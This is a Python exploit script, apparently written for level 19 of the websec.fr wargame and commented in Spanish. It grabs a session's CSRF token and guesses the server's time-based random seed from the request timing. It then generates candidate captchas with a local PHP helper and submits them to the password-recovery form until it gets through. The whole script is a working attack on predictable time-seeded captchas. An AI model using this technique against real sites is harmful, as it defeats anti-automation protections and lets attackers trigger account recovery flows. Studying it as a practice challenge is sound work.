#!/usr/bin/env python3
import requests
import time
import subprocess
from html.parser import HTMLParser

URL = "https://websec.fr/level19/index.php"

class TokenParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.token = None
    
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            attrs_dict = dict(attrs)
            if attrs_dict.get('name') == 'token':
                self.token = attrs_dict.get('value')

print("Test manual...")

session = requests.Session()

print("1. GET para inicializar sesión...")
t1 = time.time()
response = session.get(URL)
t2 = time.time()

print(f"   Tiempo antes: {t1}")
print(f"   Tiempo después: {t2}")
print(f"   RTT: {t2-t1:.3f}s")

parser = TokenParser()
parser.feed(response.text)
print(f"   Token CSRF: {parser.token}")

print("\n2. Probando 3 seeds diferentes...")
mid = (t1 + t2) / 2.0

for offset in [-100, 0, 100]:
    seed = mid + (offset / 1000.0)
    print(f"\n   Seed {seed}:")
    
    result = subprocess.run(
        ['php', 'gen_captcha.php', str(seed)],
        capture_output=True,
        text=True,
        cwd='/workspace/websec_level19'
    )
    
    captcha = result.stdout.strip()
    print(f"   Captcha: {captcha}")
    
    data = {
        'captcha': captcha,
        'token': parser.token,
        'submit': ''
    }
    
    resp = session.post(URL, data=data)
    
    if 'Password recovery email sent' in resp.text:
        print("   ¡ÉXITO!")
        break
    elif 'Invalid captcha' in resp.text:
        print("   Captcha inválido")
    elif 'Invalid session token' in resp.text:
        print("   Token inválido - necesitamos nueva sesión")
        break
    else:
        print(f"   Respuesta desconocida: {resp.text[:100]}")